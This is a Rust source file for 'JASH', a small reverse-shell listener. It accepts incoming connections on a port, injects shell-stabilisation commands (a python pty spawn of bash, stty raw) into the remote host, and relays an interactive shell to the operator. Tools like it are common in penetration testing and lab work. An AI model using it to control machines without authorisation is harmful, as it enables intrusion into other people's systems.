#![allow(unused_imports)]
#![allow(unused_variables)]
#![allow(unused_mut)]
#![allow(dead_code)]

//To do stuff
//Encryption
//custom payloads
//tabs (makes sessions more fluid)
//sessions

use colored::Colorize;
use std::env;
use std::io::ErrorKind;
use std::io::{self, Read, Write, stdout};
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::time::Duration;
use termion::raw::IntoRawMode;
// Banner printing
fn banner(ip: &str, shell: &str) {
    println!("{}", "=".repeat(30).bright_cyan().bold());
    println!("Connection to: {}", ip);
    println!("{}", "=".repeat(30).magenta().bold());
}

// Shell stabilize commands
fn stabilise_shell(mut stream: &TcpStream) {
    let _ = stream.write_all(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n");
    let _ = stream.flush();
    thread::sleep(Duration::from_millis(300));

    let _ = stream.write_all(b"export TERM=xterm\nstty raw\nclear\n");
    let _ = stream.flush();
    thread::sleep(Duration::from_millis(200));
}

// Read all available data from stream with timeout and no hanging
fn read_available(mut stream: &TcpStream) -> io::Result<String> {
    let mut response = Vec::new();
    let mut buffer = [0u8; 1024];

    // Set short read timeout so read won't block forever
    stream.set_read_timeout(Some(Duration::from_millis(500)))?;

    loop {
        match stream.read(&mut buffer) {
            Ok(0) => {
                // Connection closed
                break;
            }
            Ok(n) => {
                response.extend_from_slice(&buffer[..n]);
                if n < buffer.len() {
                    // No more data immediately available
                    break;
                }
            }
            Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                // No data ready, stop reading for now
                break;
            }
            Err(ref e) if e.kind() == ErrorKind::TimedOut => {
                // Timeout expired, stop reading
                break;
            }
            Err(e) => return Err(e),
        }
    }
    Ok(String::from_utf8_lossy(&response).to_string())
}

// Handle each client connection
// Handle each client connection
fn handle_clients(mut stream: TcpStream, addr: String) {
    let mut stdout = io::stdout().into_raw_mode().unwrap();
    let mut stdin = io::stdin();

    let mut stream_in = stream.try_clone().unwrap();
    // Remove second clone to avoid reading from a different stream that breaks output
    // let mut stream_out = stream.try_clone().unwrap();

    let input_thread = thread::spawn(move || {
        let mut buffer = [0u8; 1024];

        loop {
            match stdin.read(&mut buffer) {
                Ok(0) => break, // EOF
                Ok(n) => {
                    if stream_in.write_all(&buffer[..n]).is_err() {
                        break; // Stop on write error
                    }
                }
                Err(_) => break, // Stop on read error
            }
        }
    });

    let output_thread = thread::spawn(move || {
        let mut buffer = [0u8; 1024];
        loop {
            // Use the original stream here directly instead of cloned stream_out
            match stream.read(&mut buffer) {
                Ok(0) => break, // remote closed
                Ok(n) => {
                    if stdout.write_all(&buffer[..n]).is_err() {
                        break;
                    }
                    stdout.flush().unwrap();
                }
                Err(_) => break,
            }
        }
    });

    let _ = input_thread.join().unwrap();
    let _ = output_thread.join().unwrap();
}

fn main() -> io::Result<()> {
    // Reads port from arg or use default 1337
    let args: Vec<String> = env::args().collect();
    let port = if args.len() > 1 {
        args[1].clone()
    } else {
        String::from("1337")
    };
    if args.len() > 1 {
        match args[1].as_str() {
            "--version" | "-v" => {
                println!("JASH v0.1.0 Galley");
                return Ok(());
            }
            "--help" | "-h" => {
                println!("Usage: jash <port>");
                println!("Example: jash 1337");
                return Ok(());
            }
            _ => {
                // Unknown flag, continue as normal
            }
        }
    }

    // Bind listener
    let bind_addr = format!("0.0.0.0:{}", port);
    let listener = TcpListener::bind(&bind_addr)?;
    println!(
        "{} {} {}",
        "Listener".bright_magenta().bold(),
        "started on...".bright_cyan().bold(),
        port.bright_yellow().bold()
    );
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let addr = stream
                    .peer_addr()
                    .map(|a| a.to_string())
                    .unwrap_or_else(|_| String::from("Unknown"));
                println!("[*] Connection from > {} ", addr);
                stabilise_shell(&stream);
                println!("Press Enter to, enter the shell");
                thread::spawn(move || {
                    handle_clients(stream, addr);
                });
            }
            Err(e) => {
                println!("[!] Connection failed: {}", e);
            }
        }
    }
    Ok(())
}

// Copyright (c) 2025 MuteAvery
// Licensed under the MIT License. See LICENSE file in the project root
